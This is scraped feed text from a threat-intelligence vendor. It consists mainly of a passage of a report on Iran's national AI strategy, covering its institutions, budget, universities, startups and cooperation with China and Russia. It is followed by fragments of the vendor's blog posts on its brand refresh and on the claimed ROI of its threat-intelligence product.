Supreme Leader’s intent. Iran subsequently began creating a national AI roadmap that evaluated the “strategic documents” of 23 countries in the field of AI and developed a plan to realize Khamenei’s goal by 2032. The goals of the roadmap document were to achieve “80 percent of research to meet the needs of the country, use of 45 percent of AI in industries, $8 billion investment in AI, and a 12 percent share of AI in the GDP.\" The document contained fourteen “macro policies,” 47 “micro-policies,” 39 “general actions,” and 155 “projects and activities.” According to the roadmap, by the Persian year 1410 (starting March 2031), Iran would need to train 600,000 experts in the AI field to accomplish these objectives.\nIran’s presidency — specifically, the Vice Presidency for Science, Technology and Knowledge-based Economy — oversees the Iranian government’s effort to establish and implement an AI strategy. On December 3, 2023, President Ebrahim Raisi issued an executive order to establish the “National Steering Committee and the National Artificial Intelligence (AI) Center,” which would “focus on creating integrated AI processing and data service providers, aligning with the country’s needs, and implementing large-scale AI projects.\" He appointed Reshad Hosseini as Secretary for the Development of Artificial Intelligence and Robotics Headquarters, a role intended to develop a “technology development roadmap” and to make “maximum use of all the internal capacity of the innovation ecosystem.\" Iran’s AI Strategic Council was to be formed of “ministers and heads of relevant institutions” to “implement, coordinate, and monitor” a National AI Document.\nAfter Raisi’s death in May 2024, the administration of President Masoud Pezeshkian has continued to emphasize Iran’s AI strategy. The National AI Organization (or the National Organization for AI) was inaugurated in July 2024 in Tehran. Insikt Group identified the organization’s physical location in north central Tehran, on Molla Sadra Street (Figures 1-3). During Pezeshkian’s endorsement ceremony and National Government Week meeting in August 2024, Khamenei advised the new administration that the ”good initiative” begun under deceased President Raisi “unfortunately remains unfinished,” but advised that the National AI Organization, under the direct supervision of the President, should continue Raisi’s progress. On October 15, 2024, Iran’s Information Technology Council issued a decision that “within two months, the National Organization of Artificial Intelligence should present to the working group the requirements for creating, developing, maintaining and publishing data and information in the hyper scale database of artificial intelligence.\"\nPezeshkian appointed Hossein Afshin, a professor of mechanical engineering at Sharif University of Technology, as his Vice President for Science, Technology, and Knowledge-based Economy, who also serves as the secretary and vice president of the National AI Organization and serves as the face of AI development within Iran. Pezeshkian also assigned his First Vice President, Dr. Mohammad Reza Aref, as chairman of the National AI Organization and its strategic council. Aref’s appointment as First Vice President prompted criticism for his “political obscurity,” likely reflecting Pezeshkian’s choice for the position was based on his scientific prowess and technical acuity rather than his accomplishments as a reformist politician. The prominent role of Aref — who holds two advanced degrees in electrical engineering from Stanford University, has been a professor at two prestigious Iranian universities, and has published scholarly articles on information technology — as Pezeshkian’s deputy with oversight of the country’s AI program suggests an increasing recognition of the importance of AI.\nFigure 1: Inauguration of Iran’s National Artificial Intelligence Organization in Tehran (Source: Mehr News)\nFigure 2: Exterior of the National Artificial Intelligence Organization (Source: Google Maps)\nFigure 3: Location of the National Artificial Intelligence Organization (Source: Google Maps)\nLaying the Foundations of an AI Ecosystem\nInsikt Group examined Iranian government statements, press releases, leadership speeches, academic journals, industry websites, and news media, all of which provide key insights into the development and deployment of AI in Iran. However, these sources often provide broad knowledge about Iran’s ambitions or intentions regarding AI and lack details on the specific models, technology, or deployment of AI in support of national security objectives. Western AI companies, such as OpenAI, Google, and Microsoft, as well as global cybersecurity and military experts, offer additional perspectives and analysis of Iran’s AI use cases.\nNational AI Strategy Development and Challenges\nFollowing its leader’s 2021 directive, the Islamic Republic has striven to develop and integrate AI through the establishment of various bureaucratic entities and industry initiatives. Iran’s progress in AI advancement is almost certainly limited by two factors: (1) its economic and commercial isolation and (2) its government control and oversight. After years of international sanctions and commercial isolation, Iran’s technological advancement, particularly in security-related industries such as defense, energy, and maritime shipping, depends on indigenous and domestically engineered capabilities. Iran strives for self-sufficiency in various sectors, including food and energy, and this concept of a “resistance economy,” which underpins Iranian strategic culture and economic development priorities, very likely shapes the development of Iran’s AI ecosystem. The Iranian government almost certainly disseminates the narrative that Iran is a competitor in an AI global race and seeks to prove its technological prowess. As a result of Iran’s national ambitions for AI, its development ecosystem is very likely government-driven, in partnership with private industry and academia. Iranian technological leaders very likely understand that foreign advances in AI computing power, including private technology companies, can both benefit and augment Iran’s own internal efforts and uses. This dynamic — a top-down national strategy and AI technical development framework that is supported rather than driven by Iran’s own private sector innovation — is likely to limit the potential of Iran’s AI advances.\nIran’s own private sector innovation is likely stifled by its economic isolation and its dependencies on government funding and direction. Iran claims that the government’s expanded support to the tech sector resulted in a surge of Iranian venture capital firms, accelerators, and “innovation centers” between 2019 and 2020, as these firms provided localized solutions amid global supply chain disruption (after the US withdrew from the Iran nuclear agreement and re-imposed sanctions). However, according to a 2022 United Nations report on Iran’s innovation landscape, sanctions significantly hampered Iran’s “startup ecosystem” and the domestic and foreign appetite for investments in Iranian technology startups after 2018 was “reduced substantially.” Iran’s challenges and limitations are reflected in several global indices that analyze and measure AI advances and technological innovation across countries. Stanford University’s Global AI Vibrancy Tool, which defines AI vibrancy as “the level of activity, development, and impact of AI technologies within a country,” does not include Iran in its analysis of 36 countries leading AI-related metrics. Iran is ranked 64th in the Global Innovation Index, which reflects a notable improvement over the last ten years. However, Iran’s institutional, regulatory, and business environments ranked 127th, 131st, and 128th, respectively, underscoring the systemic challenges to Iran’s innovation ecosystem. Oxford Insights ranked Iran 91st of 193 countries in the 2024 “Government AI Readiness Index,” a three-position improvement from its 2023 ranking, but scored lowest in the “vision,” “adaptability,” and “maturity” dimensions.\nIn 2022, Iran revealed fifteen policies shaping its AI development roadmap. A key theme underpinning these policies was the importance of national research centers, private industries, and universities working together to advance Iran’s AI development. Notably, two of the policies sought to support the private industry’s use of “academic plans” and to increase private industry’s trust in universities, likely suggesting a divide between Iran’s technical industry and its academic institutions. Another key theme of the policies was increasing foreign engagement and cooperation between Iranian and foreign academic centers. This likely reflects Iran’s interest in leveraging foreign partnerships, particularly with countries that are adversarial to the West, in the AI field.\nIn July 2023, a study from the Journal of Science & Technology Policy found that “the artificial intelligence ecosystem in [Iran] has not yet taken shape in the true sense” and “there is still no relative consensus among actors for dividing tasks and missions.\" Less than a year later, the same journal — which is affiliated with Iran’s National Science Policy Research Center — published a Nowruz 1403 (Persian new year, corresponding with March 2024) special edition entitled “Generative Artificial Intelligence: Multiple Perspectives on Opportunities, Challenges, and Implications in Research, Practice, and Policymaking” that examined the “abundant ethical and legal opportunities and challenges” of AI, specifically ChatGPT’s “practical, ethical, semantic, and policy challenges.\" The study’s conclusion highlighted the “lack of well-developed ethical guidelines” and noted that it is “vital that new rules be established to govern these instruments, and given their global nature, international coordination is also necessary to maximize their benefits.” The 43 “expert” authors from various business and technological fields disagreed about whether ChatGPT should be restricted or legalized in Iran.\nIran’s bureaucratic challenges in the AI realm, including changes in presidential administrations and a plethora of organizational stakeholders with overlapping responsibilities, likely limit the country’s ability to implement an overarching strategy for its AI development. Tehran’s policy toward AI is overseen by Iran’s Supreme Council of the Cultural Revolution (SCCR) — a strategic policy body that answers only to the Supreme Leader — whose approval in June 2024 was required to move forward with the National AI Organization, steering council, and the document’s “generalities.” This approval involved review of the AI organization’s statutes and 18,000 supporting documents to ensure the project was not “tainted by Western influence.” The SCCR established a specialized Commission for AI in September 2022 composed of officials from all armed forces branches, the General Staff of the Armed Forces, the Office of the Supreme Leader, the Ministry of Intelligence, and the Ministry of Higher Education. In January 2025, Pezeshkian noted the importance of AI development in a meeting with the SCCR, asserting that “any delay or backwardness in the development of AI in Iran would be damaging and irreparable.” Domestic critics of Iran’s AI policy have raised concerns about the “unstable decisions, constant policy changes, and lack of a clear roadmap” that has hampered the country’s AI program. For example, in December 2024, Afshin announced that the cabinet was drafting a charter for the National AI Organization that would focus on the organization’s role in planning and overseeing AI activities; three months later, semi-official news agency Tasnim News suggested the possibility that the National AI Organization could be dissolved, raising a “series of contradictions” and “unanswered ambiguity.”\nAI Budget\nDocumentation of Iran’s investment and funding of AI is opaque, but even with conflicting information, Iran’s lack of significant AI funding compared to its competitors will likely imperil its top-ten AI ambitions. The SCCR reportedly allocated a budget totaling 3.5 trillion Tomans (“over 83 million dollars”) in its approval; Iran’s initial operating budget for AI has also been reported as $50 million USD. According to the Tehran Times, 50 trillion rials (“some $100 million”) has been allocated for the development of AI operators during Persian year 1403 (between March 2024 and March 2025). In January 2025, Iran’s National Development Fund — independent of the Iranian government budget — agreed to allocate $15.6 million USD to AI projects in universities and private research centers, while another $100 million USD will be provided in the form of loans. These funding numbers lag significantly behind the AI budgets of regional competitors like the United Arab Emirates (approximately $1.2 billion USD) and Saudi Arabia (approximately $2 billion USD).\nGovernment Entities\nInsikt Group identified a number of government entities that are involved in the direction, strategic planning, and national coordination for the development of Iran’s AI capabilities. The protracted process for the formulation of Iran’s national AI strategy document, which has involved a cross-agency collaboration process with multiple stakeholders, likely reflects a bureaucratic competition for influence and ownership of AI leadership within the Iranian government. The division of power among various government elements has likely hampered Iran’s ability to form a cohesive AI strategy and development plan.\nOrganization\nRole in AI Development\nSupreme Council of the Cultural Revolution (SCCR)\nCreated following the 1979 Islamic Revolution to ensure Iran’s higher education system adhered rigorously to Islamic Revolution ideals\nApproves Iran’s national AI documents and organization\nEstablished a Commission for AI and Cyberspace among its “specialized committees\nLikely aims to preserve Iran’s culture and religious ideals in the development of AI, given its original mandate\nVice Presidency for Science, Technology and Knowledge-based Economy\nEstablished in 2006 with the SCCR’s approval “to support and strengthen the scientific and research activities of elites” and to develop national strategic and prioritized technologies\nTasked by the Iranian president “to interact with AI specialists in universities, research centers and Parliament” to study “different dimensions of AI,” “with the aim of adopting policies and formulating laws\nLikely plays a critical role in implementing Khamenei’s vision and directing resources for Iran’s AI advancement, driving cooperation among technological experts on national AI-related projects and initiatives\nNational Artificial Intelligence Organization (or National Organization for AI)\nUnder the supervision of the Iranian President\nLaunched in July 2024, after SCCR’s approval of statutes and 18,000 supporting documents\nTasked with “implementing a national AI strategy” and “to provide sufficient resources, with support from the National Development Fund, to create the necessary infrastructure” and “support private companies in developing advanced AI models and algorithms\nAims to “plan and oversee AI activities rather than directly intervene\nMinistry of Information and Communications Technology (ICT)\nConsidered to be the “executive core of artificial intelligence” in Iran\nA subsidiary, the Information Technology Organization of Iran, is responsible for “facilitating e-services delivery” and “to develop and maintain the country’s national information exchange center”\nICT Research Institute (Formerly ITRC)\nEstablished in 1970 at the University of Tehran\nServes as the main research arm for ICT nationwide, while “customizing and channelizing advanced information technology at industry level\nArtificial Intelligence Innovation and Development Center\nUnder the oversight of the ICT Research Institute\nInvolved in “planning, executing the evaluating and providing quality assurance certification for AI products and services”\nIncludes specialized “laboratories” for the development and evaluation of AI products and services, including machine vision and image processing, text and natural language processing, speech and audio processing, biometrics, data processing, and cognitive science\nNational Cyberspace Center\nMonitors and directs the activities of various organizations, including the Vice Presidency’s efforts “for employing innovative technologies in the virtual space, such as artificial intelligence, blockchain, quantum computing, and data science\nTable 1: Iranian entities involved in AI strategy (Source: Recorded Future)\nIran’s military plays a key role in technological developments through civil-military cooperation, which very likely extends into the AI realm. Iranian armed forces, including the Islamic Revolutionary Guard Corps (IRGC), have affiliated universities and science and technology (S&T) parks and run their own technology parks as “incubators.” For example, Imam Hossein University — affiliated with the IRGC — has a technology center and hosted “The International Conference on Artificial Intelligence and the Future Civilization” on January 29, 2025. Iran’s military branches from the Army and IRGC’s ground, naval, and air forces each have their own research and development entity, referred to as a Research Self-Sufficiency and Jihad Organization (RSSJO), that conducts specialized and tailored R&D for the unique needs of their respective forces. These RSSJOs are likely involved in independent efforts in defense-related R&D and in cooperation with academic institutions; they are likely integrating AI development into those efforts. Iran’s Ministry of Defense and Armed Forces Logistics (MODAFL) also likely has a key role in defense-related AI development, having signed partnership agreements with 80 universities and 800 industrial towns in Iran.\nGovernment Initiatives\nAnnouncements by the Vice Presidency for Science, Technology and Knowledge-based Economy regarding its AI development initiatives likely suggest Iran is working to develop a sovereign AI capability — meaning an Iranian national capability to produce AI using its own infrastructure, data, workforce, and business networks through the development of foundation models trained on local datasets that reflect local language and culture. Hossein Afshin, Iran’s Vice President for Science, Technology and Knowledge-based Economy, hosted a meeting with the “Technology Group” from Tarbiat Modarres University on December 1, 2024, during which he reviewed the team’s progress, requirements, and support mechanisms for its “Project for Designing a Large Native Iranian Language Model.” He subsequently announced on December 3, 2024, that a prototype of Iran’s “national AI operating system,” which was “designed to host AI algorithms locally,” was expected in six months. Iran intends to launch the country’s first GPU data center by 2025 and plans to establish its first AI park — to “showcase the technological developments of the country and provide practical AI-related services to the people” — within the next two years.\nOn March 15, 2025, Vice President Afshin unveiled Iran’s national AI platform and announced a phased rollout of the project, framing it as a strategic move in a global “war of chips and algorithms.” The platform’s initial testing and optimization are planned for the first half of 2025, followed by limited access for technology experts and companies in the third quarter, a public beta release in September 2025, culminating with a public release in approximately March 2026. Over 100 Iranian professors and researchers collaborated on the project, which was developed in cooperation with Sharif University of Technology — an institution that is sanctioned for its links to the IRGC and MODAFL related to military and ballistic missile technology development. An expert developer and representative of Sharif University, Hossein Asadi, noted that the AI platform was developed using an open-source framework and specifically highlighted that it would be “entirely independent, with no reliance on foreign APIs [application programming interfaces],” ensuring the platform’s services would continue without disruption “even if the country’s internet were to be completely disconnected.”\nIran almost certainly seeks to leverage domestic resources to support these development initiatives. On December 13, 2024, Afshin declared the government’s intention to jumpstart domestic chip production for AI through the “Sahand National Project” (“پروژه ملی سهند”). The Sahand National Project is consistent with Iran’s focus on leveraging its own human and natural resources to deliver indigenous technological solutions and is likely a reaction to an anticipated increase in economic isolation under the US presidential administration of Donald Trump. The US government announced export restrictions on January 13, 2025, which are designed to curtail the sale of chips with high-computational graphics processing unit (GPU) power for AI advanced development (such as Nvidia’s A100 and H100 chips) to sanctioned countries like Iran.\nAccording to Iranian media, the project’s aim is to manufacture “nine-nines” (99.9999999%) purity silicon wafers, the first step in setting up a domestic supply chain for microchips, with a view to open Iran’s first GPU data center by “early 2025.” While public information on the project remains limited, its reported location — in Sahand, East Azerbaijan province — would likely have been chosen for its proximity to Sahand Industrial Group (SIG), Iran’s leading glass and silica producer, and the Sahand University of Technology, which has specialized laboratories in material and nanomaterial engineering. Using satellite imagery, Insikt Group identified a new two-million-square-foot facility under construction near an existing SIG silica manufacturing plant in Sahand, showing significant investment in the region’s industrial capabilities.\nFigure 4: Satellite imagery of a two-million square foot facility between May 2020 and May 2024 near an SIG silica plant in Sahand, East Azerbaijan, Iran (Source: Google Earth)\nAnother government initiative announced on January 11, 2025, by Afshin aims to establish a hub for AI innovation in the oil and gas industries on Kish Island, Southern Iran, in association with the Persian Gulf Petrochemical Industries Company and the Kish Free Zone Organization. The location choice likely enables the Iranian government to unlock three benefits for the acceleration of AI development: the Kish Free Zone’s lax foreign investment and fiscal policies to encourage foreign direct investments (FDI); existing infrastructure, including an international airport and ports that can be leveraged for international transit; and lax entry visa requirements on Kish Island that enable reputable Iranian academic institutions (such as Sharif University of Technology, which has an international campus in Kish) to attract foreign talent and investment.\nIran has announced several AI-enabled tools for the benefit of the Iranian government and society. Alongside his announcement of Iran’s domestic chip production project in December 2024, Afshin also declared that the Iranian government has prioritized the development of “AI assistants” available to government officials, developed “in collaboration with universities” with a team of over “70 expert professors.” The AI assistants are reportedly expected to help government ministers to “extract both laws and regulations and production-related issues from data” and “make suggestions in decision-making.” In August 2024, Iran’s National Cyberspace Center announced the Arbaeen Artificial Intelligence Assistant (which references Arbaeen, a Shi’ite holy day, during which Shi’a Muslims make a pilgrimage to Iraq) was “a guide for pilgrims to access routes and processions, management of information for scheduling ceremonies and events, as well as the status of health and medical services, weather conditions, and even cultural and linguistic guidance online.” In November 2024, Iran’s national religious headquarters, located at Qom Seminary, launched an “indigenously developed platform that uses AI to answer questions and remove doubts on religious issues.” Dubbed Deendaan, the platform was introduced by the seminary’s National Center for Answering Religious Questions. Another entity in Qom, the Noor Computer Centre for Islamic Sciences Research, is seeking to incorporate AI in its use of religious texts and data to “accelerate the Islamic studies of senior clergy and speed up their communication to the public.”\nAcademia\nIran’s most globally recognized AI innovation, the Surena IV humanoid robot, was developed by Iran’s academic sector, underscoring the key role of universities and research institutes in Iran’s AI ecosystem. Created at the Center of Advanced Systems and Technologies (CAST) at the University of Tehran, the robot’s fourth generation uses the “Robot Operating System” for “state monitoring, real time implementation of algorithms, and simultaneous running of several programs.” The robot was listed as one of the top ten humanoid robots in 2020, according to the American Society of Mechanical Engineers. In addition to developing the Surena humanoid, CAST has a “portfolio” of projects related to various fields, including “mechatronics, robotics, and intelligent systems inspired by nature,” as well as “aquatic inspired” robots and those “inspired by birds.”\nFigure 5: Surena IV, developed at the University of Tehran (Source: IEEE)\nLeading Iranian universities in the field of AI include the University of Tehran, Amirkabir University of Technology, and Iran University of Science and Technology, all located in Tehran. According to the state-run news outlet Tehran Times, over the last ten years, the most “scientific productions” in artificial intelligence have been associated with Tehran University, Tabriz University, and Amirkabir University of Technology. However, these universities likely remain low on global rankings for AI research; the University of Tehran, widely recognized as the best higher education institution in Iran, ranks at number 201 globally for AI. Edurank data suggests that Iran’s top three universities are ahead or on par with their Russian peers (Moscow State University, St. Petersburg State University, and the National Research University) but far behind China (Tsinghua University, Harbin Institute of Technology, and Shanghai Jiao Tong University) in terms of production (number of publications) and influence (number of citations). Iranian national investment in AI research is likely less than Russian investment, but its academic citation numbers are greater than Russia’s, likely reflecting that Iran’s AI academics maintain disproportionate influence in their field relative to their Russian counterparts.\nFigure 6: Top three universities in Iran, Russia, and China by papers and citations in the field of AI (Source: Edurank)\nIn the absence of a vibrant private AI sector, the Iranian government is likely reliant on academics specialized in AI for government projects at the expense of cutting-edge research. Iranian media boasted that “70 expert professors” were working to design an AI platform for government ministers. Sharif University of Technology, ranked fourth in Iran in AI, is likely a key partner for government projects, such as Iran’s national AI platform. The government demand for expertise likely represents a misallocation of research talent towards state-mandated engineering projects, which likely impedes Iran’s research potential. However, Iranian academic centers may also be exploring open-source AI development, which likely encourages innovation. For example, in November 2024, Amirkabir University, in collaboration with AI developer Part AI, announced the development of the “most comprehensive and powerful evaluation system for Persian language models,” known as Open Persian LLM Leaderboard, which includes over 40,000 samples and tracks the performance of 25 major open-source models at Persian-language tasks. Part AI has also published six open-source models, including Persian finetunes of Meta’s Llama 3.1 and Google’s BERT models.\nA search of recent and upcoming conferences related to AI suggests Iran’s academic sector is exploring AI applications in several sectors, including medical sciences, telecommunications, electrical engineering, education, mining, and industry. In 2024, Iran held a number of inaugural national conferences on specific topics, very likely suggesting the concept of how AI can benefit specific industrial sectors is still nascent in Iran. For example, in October 2024, Iran held the first national conference on AI in education and learning; in May 2024, Iran held its first national conference on AI and the Internet of Things; in April 2024, it held its second national conference on Digital Transformation and Intelligent Systems.\nFigure 7: Poster of international AI conference which notes the cooperation “with prestigious universities and scientific centers of Iran and the world” (Source: Imam Hossein University)\nIranian universities are very likely driving international engagement by hosting conferences on AI. A review of international AI-related conferences held in Iran in 2024 and planned for 2025 highlights a wide range of foreign academic participants, including academics from Austria, Australia, Canada, China, France, Italy, Iraq, Malaysia, Russia, Spain, Vietnam, and the United Kingdom. Iranian academic output on AI likely benefits from strong ties with Iranian-American researchers and collaboration with US academic institutions. An Iranian study of domestic output of AI research between 1978 and 2022 found that US researchers were the most frequent international co-authors on Iranian AI research. However, Iranian academic AI research likely remains of limited international influence. 19.9% of Iranian AI papers during this period received no citations, with the majority receiving between one and five citations.\nFigure 8: Network map of countries co-authoring with Iranian AI researchers between 1978 and 2022, based on the Scopus database (Source: Shahed University)\nPrivate Technology Companies\nIran’s private sector currently faces significant challenges in the face of international sanctions and lack of global competitiveness, including the inability to retain top talent, the absence of foundational AI model companies, low capital expenditures on AI by existing major players in the technology sphere, and a nascent venture capital (VC) ecosystem.\nIran almost certainly suffers from a significant talent outflow of skilled workers in technology and AI. According to a 2021 report by the Iran Migration Observatory, 50% of Iranians involved in startup communities and 44% of graduates were planning on emigrating, citing unpredictable internet regulations, censorship, and lack of wage competitiveness as direct factors. In December 2024, Iran’s Vice President Afshin announced a new regulation offering monthly grants of approximately 15 million Tomans ($3,564 USD) for PhD students to encourage research and scientific activities, stressing the importance of preventing talent migration.\nDespite talent shortages, Indian data provider TraxCN has identified at least 85 companies in Iran advertised as operating in the field of AI, with a majority focusing on developing AI enterprise applications and tools for healthcare, agriculture, and finance. Several companies provide chatbot services and LLMs, including Persian-language chatbots; however, it remains unclear whether they are developing proprietary models rather than deploying existing open-source models. Additionally, TraxCN considers that seventeen (20%) of these companies are currently “deadpooled” (no longer in business) and 60 (80.5%) remain unfunded, indicating that despite government efforts to incentivize AI startups, the average Iranian AI startup is doomed to fail in raising funds or operating sustainably. Iranian AI website Hooshio published a list of 29 Iranian AI companies, highlighting the Parth AI Research Center as “one of the top five companies in the Middle East” with more than 150 specialists in AI. The company claims to have Iran’s “biggest AI research center” with a department for machine vision, natural language processing (NLP), speech processing, and data analysis, as well as an AI college.\nIran’s private tech sector is likely trying to financially motivate AI innovation and engage with Iran’s developer community. Digikala, Iran’s biggest technology and e-commerce company (valued at approximately $500 million USD as of August 2024), hosted an AI hackathon in March 2024 with a first-place prize of 60 million Tomans (approximately $14,258 USD). Notably, the hackathon’s rules banned participants from using Western AI models (listing models from Western companies like OpenAI, Anthropic, and Cohere), likely intending for participants to focus on using open-source models for hackathon entries.\nUnlike their Western and Chinese counterparts, Iranian VC funds are likely limited in their ability to fund and support a domestic AI startup ecosystem to fulfill national security and economic priorities, with startups forecasted to raise $28.13 million USD in capital in 2025 across all sectors. Iran’s Pardis Technology Park (PTP), dubbed “Iran Silicon Valley” and operating “under the auspices of” the Vice Presidency for Science, Technology, and Knowledge-based Economy, is “the most significant center for developing startups and knowledge-based companies and commercialization of technology and innovations in Iran.” PTP, which is part of the Iran International Innovation District, boasts 25.5 million EUR of foreign investments in its companies over the last five years and is also supported by the Iran National Innovation Fund, Iran’s version of a venture capital and private equity firm.\nFigure 9: Forecasted capital raised by startups for 2025 in China, Russia, and Iran (Source: Statista 1, 2, 3)\nOpen Source\nOpen-source communities play an important role in the development of AI capabilities, as open-source AI models can lower research and development costs, present opportunities for technology transfers, and reduce dependency on models developed by foreign companies. Iran’s open-source community almost certainly lags behind in terms of developing home-grown AI models, finetunes, and datasets. Data from open-source AI model platform HuggingFace shows that Farsi-language models (including multilingual models from US AI companies) are outnumbered by open-source models with language capabilities for Mandarin, Korean, or Russian. Sanctions are almost certainly throttling the emergence of a strong Iranian open-source software community. GitHub, a major platform for hosting open-source code, was blocked in Iran in 2019 and only resumed operations in 2021 after securing a special license from the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) board.\nFigure 10: Number of models published on HuggingFace with language capabilities in Farsi, Russian, Korean, and Chinese (Source: HuggingFace)\nIran’s biggest open-source AI contributor, measured by the number of Farsi-language AI models published on Hugging Face, is likely Hezar AI, followed by Persian NLP and Hooshvare Research Lab. US technology companies Facebook and Google are also among the top ten publishers of Farsi-language models on HuggingFace.\nForeign Cooperation\nIran’s Organization for Development of International Science and Technology Cooperation (ODISTC) very likely plays a critical role in facilitating the exchange of ideas, goods, and services related to AI. ODISTC was set up “to serve as a foundation for increasing scientific, technological and innovation communications with other countries, as well as securing a significant share of the regional and global trade of knowledge-based products.” Among the services offered in ODISTC’s “Technological Exchange Office” is “bilateral scientific and technology cooperation in the form of joint research funds with the [sic] countries like China and Russia.” More details pertaining to Iran’s cooperation with China and Russia are discussed below.\nChina\nIran’s technological cooperation with China is very likely a key strategic interest for Iran’s AI development. In 2021, Iran’s Strategic Council on Foreign Relations promoted building relationships between Iranian and Chinese technology companies and higher education institutions. AI was specifically mentioned as part of the Iran-China 25-year Comprehensive Partnership, officially signed in March 2021. A leaked version of the plan, sourced from Iran’s Ministry of Foreign Affairs and reported by the Wilson Center, proposed the cooperation involved “introducing joint pilot projects in the fields of smart technology and artificial intelligence.” Second to the sale of its oil to China, Iran likely views AI development and technological exchanges as a top priority for its bilateral relations with China, and China’s challenge to US dominance in AI development aligns with Tehran’s goal to oppose US hegemony.\nChina’s use of AI for surveillance and monitoring has very likely been the most robust area for Iran’s foreign AI engagement, enabling Chinese companies to expand their export of specific technologies that facilitate Iranian domestic repression. However, academic and research collaboration is very likely another key area in which Iran’s technology sector is benefitting from the relationship with China. In November 2024, Iranian company Bayan Rayan — the country’s only server producer — received an award at the 26th annual China Hi-Tech Fair (CHTF) 2024. In 2022, an official at Iran’s Islamic Azad University touted the Iran-China agreement as a “golden opportunity to boost cooperation in AI” and benefit from Chinese advancement in the AI field, noting that Iran had 3,000 Iranian students studying in China.\nRussia\nThe anti-West strategic alignment and commercial isolation that Iran and Russia both share, particularly as a result of Russia’s war with Ukraine, has resulted in deeper cooperation in many security-related fields. Despite the increased cooperation in several spheres, specific details on the extent of the current Iran-Russia collaboration on AI R&D are limited. In January 2025, Tehran and Moscow signed a comprehensive twenty-year strategic partnership agreement that reinforced areas of ongoing cooperation in the technical sphere, including information and communication technologies, digital development, and higher education. While the text of the agreement does not specifically mention AI, Iran’s Ministry of Foreign Affairs stated the agreement “provides a platform for sharing knowledge and collaboration in fields such as nanotechnology, aerospace, artificial intelligence, and medical sciences” and expands cooperation at the government and academic levels.\nLeading up to the 2025 comprehensive agreement, a flurry of Iran-Russia cooperation documents and engagements have promoted cooperation on AI. In March 2024, the two countries signed a Memorandum of Understanding to cooperate on ethics in AI, “exchanging experiences in the implementation of the ethical principles of AI.” The agreement specified that the Russian Commission on Ethics in AI would provide training for Iran’s AI and Robotics Development headquarters. In November 2019, Russia and Iran signed a Memorandum of Understanding on cooperation to support twenty joint research plans in fifteen scientific fields, including, among others, information technology, computer systems, and AI.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1e430aec3dd53db87cdf407428a51f105aa24bf0e.png?width=1200&format=pjpg&optimize=medium"},"content":"Explore how Iran is leveraging AI for cyberwarfare, influence ops, military tech, and domestic surveillance.

This evolution arrives at a pivotal moment when organizations face increasingly sophisticated threats that demand clarity, focus, and actionable insights.\nThe inspiration for this refresh became clear while walking the floors at cybersecurity conferences. Amid a sea of sameness – dark displays, matrix-like code animations, and ubiquitous hooded figures – the messaging blends together in an indistinguishable haze of technical jargon and vague promises.\nFor security leaders tasked with protecting their organizations, this uniformity creates a real challenge: how to identify what truly matters when everyone looks and sounds the same?\nThis observation became the catalyst for our brand refresh – not just as a marketing initiative, but as an authentic expression of how Recorded Future helps security professionals cut through overwhelming noise to focus on what's essential.\nDeconstructing our brand heritage.\nThis journey wasn't about creating a new logo – Recorded Future already had a strong visual mark. Instead, we focused on building a comprehensive visual and verbal language that embodies clarity and precision. The deconstructed logo became an important aspect of our brand system, allowing us to create meaningful visual elements that connect our identity with the purpose that has been at the heart of our company since we were founded in 2009.\nIt also became a symbol of premium offering in the category.

However, premiums can be substantial, particularly for organizations that face significant risk.</p>\n        <p>Based on observable market data and the average 2024 <a href=\"https://www.ibm.com/reports/data-breach\">cost of a breach</a> being $4.88 million, a typical billion-dollar company likely pays a yearly premium of $207,400, or $35-50,000 per million of coverage.</p>\n        <p>Recorded Future customers report average monthly premium savings of $2,497—approximately $30,000 annually. One customer, <a href=\"https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&amp;wmediaid=1j7x7zezcc\">Cummins</a>, achieved an impressive 32% year-over-year reduction in cyber insurance premiums after implementing Recorded Future's threat intelligence platform.</p>\n        <h3>Operational Disruption and Downtime</h3>\n        <p>Service disruptions resulting from cyber incidents carry dual consequences: immediate revenue losses and lasting reputational damage. <a href=\"/blog/reducing-operational-risk-with-threat-intelligence\">Reducing operational risk</a> has become a priority for organizations of all sizes. When systems go offline due to ransomware or distributed denial-of-service (DDoS) attacks, every minute of downtime translates to financial impact.</p>\n        <p>Our customers report that threat intelligence from Recorded Future helps minimize downtime, which for a billion-dollar organization translates to an average revenue value of approximately $19,025 per month—or nearly $230,000 annually. This calculation doesn't even account for the additional benefit of avoiding reputational damage that inevitably accompanies service disruptions.</p>\n        <p>“Recorded Future allows us to shift our mindset from being more reactive in nature to being more proactive and responsive to threats that went unnoticed in the past. This, in turn, has facilitated the development of new processes that have enhanced the overall security posture of the business,\" explains a <a href=\"https://app.userevidence.com/assets/2791JWBD\">Lead Cyber Defense Engineer at a major food and staples retailing company</a>.</p>\n        <h3>Fraud Prevention</h3>\n        <p>Payment fraud, transaction fraud, and billing schemes represent significant financial threats to businesses across industries. Through comprehensive threat intelligence, organizations can identify and mitigate these risks before they materialize into actual losses.</p>\n        <p>Recorded Future’s threat intelligence helps customers reduce fraud losses. A billion-dollar business that loses $500,000 annually to payment fraud losses would recover over $6,812 per month through improved threat intelligence with Recorded Future. Outside of the payments themselves, fraud loss mitigation also contributes financially by strengthening the integrity and trustworthiness of your business.</p>\n        <p>As one customer, a <a href=\"http://uevi.co/4047UHKE\">Senior Information Security Analyst at Jefferson Bank</a>, noted: \"We use Recorded Future's dark web intelligence to proactively stop attacks, reset weak passwords, or prevent bank card fraud. This has a potential savings of $1,000-2,000 depending on the customer or situation.\"</p>\n        <h3>All Together: The ROI of Business and Brand Risk Reduction with Recorded Future</h3>\n        <p>Across all risk reduction areas, customers can save approximately $31,000 monthly—or $371,000 yearly.</p>\n        <p>This substantial return breaks down into several key components:</p>\n        <ul>\n          <li>$2,602 monthly from brand reputation protection</li>\n          <li>$2,497 monthly from reduced cyber insurance premiums</li>\n          <li>$19,025 monthly from downtime avoidance/increased uptime</li>\n          <li>$6,812 monthly from fraud loss prevention</li>\n        </ul>\n        <p>Together, these savings represent a 209.4% ROI on business risk reduction alone. When combined with the <a href=\"/blog/improving-cybersecurity-productivity-threat-intelligence-recorded-future-drives-roi\">productivity improvements that threat intelligence enables (an additional 141.9% ROI), Recorded Future customers achieve a total of 351.3% ROI</a> annually.</p>\n        <h2>Implementing a Proactive Cybersecurity Strategy</h2>\n        <p>To realize the full business impact of threat intelligence, organizations should follow a structured approach to implementation:</p>\n        <h3>1. Define 